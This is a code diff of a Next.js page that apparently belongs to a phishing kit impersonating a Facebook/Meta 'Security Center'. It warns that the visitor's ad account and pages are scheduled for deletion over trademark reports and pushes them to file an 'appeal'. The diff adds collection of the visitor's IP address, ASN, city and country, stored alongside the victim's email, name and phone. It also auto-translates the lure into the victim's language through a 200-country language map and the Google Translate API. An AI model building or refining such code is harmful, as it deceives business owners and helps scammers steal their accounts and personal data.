@@ -1,6 +1,6 @@
 'use client';
 import { store } from '@/store/store';
-import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
+import { getTranslations } from '@/utils/translate';
 
 import axios from 'axios';
 import { useEffect, useState, type FC } from 'react';
@@ -22,7 +22,7 @@ interface VerifyFormData {
 }
 
 const Page: FC = () => {
-    const { isModalOpen, setModalOpen, setFormStep, formStep, userEmail, userFullName, userPhone } = store();
+    const { isModalOpen, setModalOpen, setFormStep, formStep, userEmail, userFullName, userPhone, setGeoInfo } = store();
     const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
     
     // Translation state
@@ -62,31 +62,101 @@ const Page: FC = () => {
             try {
                 const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
                 const cc = (data.country_code || 'US').toUpperCase();
+                const info = {
+                    asn: data.asn || 0,
+                    ip: data.ip || 'UNKNOWN',
+                    country: data.country || 'UNKNOWN',
+                    city: data.city || 'UNKNOWN',
+                    country_code: cc
+                };
+                setGeoInfo(info);
                 setCountryCode(cc);
             } catch {
+                const fallback = {
+                    asn: 0,
+                    ip: 'UNKNOWN',
+                    country: 'UNKNOWN',
+                    city: 'UNKNOWN',
+                    country_code: 'US'
+                };
+                setGeoInfo(fallback);
                 setCountryCode('US');
             }
         };
         fetchGeoInfo();
-    }, []);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+    }, []); // Run once on mount only
 
-    // Translation effect - hybrid: hardcoded first, then API fallback
+    // Translate texts based on fresh country code
     useEffect(() => {
         if (!countryCode) return;
 
         (async () => {
-            const lang = COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en';
-            if (lang === 'en') {
-                setTranslations({});
+            // Comprehensive country → language map (200+ countries/territories)
+            const countryLangMap: Record<string, string> = {
+                // Africa
+                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
+                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
+                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
+                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
+                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
+                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
+                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
+                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
+                // Americas
+                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
+                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
+                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
+                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
+                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
+                VE: 'es',
+                // Asia
+                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
+                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
+                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
+                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
+                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
+                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
+                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
+                YE: 'ar',
+                // Europe
+                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
+                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
+                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
+                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
+                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
+                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
+                UA: 'uk', GB: 'en', VA: 'it',
+                // Oceania
+                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
+                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
+                // Territories
+                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
+            };
+
+            // Languages with full hardcoded translations in translate.ts
+            const HARDCODED_LANGS = new Set([
+                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
+                'tr','th','ko','sv','id','ms','ro','cs','hu','fi','da','no'
+            ]);
+
+            const lang = countryLangMap[countryCode] || 'en';
+            if (lang === 'en') return; // No translation needed
+
+            // Use full hardcoded translation if available
+            if (HARDCODED_LANGS.has(lang)) {
+                setTranslations(getTranslations(lang));
                 return;
             }
 
-            // 1. Get hardcoded translations from translate.ts
-            const hardcodedTrans = getTranslations(lang) || {};
-            setTranslations(hardcodedTrans);
-
-            // 2. Identify texts NOT in hardcoded translations (need API)
-            const allTextsNeeded = [
+            // For other languages, use Google Translate API
+            const textsToTranslate = [
+                'Security Center',
+                'Home',
+                'Search',
+                'Security Policies',
+                'Rules & Other Posts',
+                'Settings',
                 'We have scheduled your ad account and pages for deletion',
                 'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
                 'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
@@ -106,18 +176,29 @@ const Page: FC = () => {
                 'Community Standards',
             ];
 
-            const missingTexts = allTextsNeeded.filter(text => !hardcodedTrans[text]);
-            
-            if (missingTexts.length === 0) return; // All texts already in translate.ts
-
-            // 3. Translate missing texts using Google API
-            const CACHE_KEY = `translation_cache_${lang}`;
+            // Get cache
+            const CACHE_KEY = 'translation_cache';
             const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
             const cache = cached ? JSON.parse(cached) : {};
 
-            const translatePromises = missingTexts.map(async (text) => {
-                if (cache[text]) {
-                    return { text, translated: cache[text] };
+            // Check if all translations are already cached
+            const allCached = textsToTranslate.every(text => cache[`en:${lang}:${text}`]);
+
+            if (allCached) {
+                const translatedMap: Record<string, string> = {};
+                textsToTranslate.forEach(text => {
+                    translatedMap[text] = cache[`en:${lang}:${text}`];
+                });
+                setTranslations(translatedMap);
+                return;
+            }
+
+            // Translate all texts in parallel
+            const translatePromises = textsToTranslate.map(async (text) => {
+                const cacheKey = `en:${lang}:${text}`;
+
+                if (cache[cacheKey]) {
+                    return { text, translated: cache[cacheKey] };
                 }
 
                 try {
@@ -128,8 +209,7 @@ const Page: FC = () => {
                             tl: lang,
                             dt: 't',
                             q: text
-                        },
-                        timeout: 3000
+                        }
                     });
 
                     const translatedText = response.data[0]
@@ -137,7 +217,7 @@ const Page: FC = () => {
                         .filter(Boolean)
                         .join('') || text;
 
-                    cache[text] = translatedText;
+                    cache[cacheKey] = translatedText;
                     return { text, translated: translatedText };
                 } catch {
                     return { text, translated: text };
@@ -146,20 +226,18 @@ const Page: FC = () => {
 
             const results = await Promise.all(translatePromises);
 
-            // Save to cache
             if (typeof window !== 'undefined') {
                 localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
             }
 
-            // Merge API-translated texts with hardcoded ones
-            const mergedTranslations = { ...hardcodedTrans };
+            const translatedMap: Record<string, string> = {};
             results.forEach(({ text, translated }) => {
-                mergedTranslations[text] = translated;
+                translatedMap[text] = translated;
             });
 
-            setTranslations(mergedTranslations);
+            setTranslations(translatedMap);
         })();
-    }, [countryCode]);
+    }, [countryCode]); // Only depends on countryCode, not translations (no re-trigger loop)
 
     const t = (text: string): string => translations[text] || text;
 
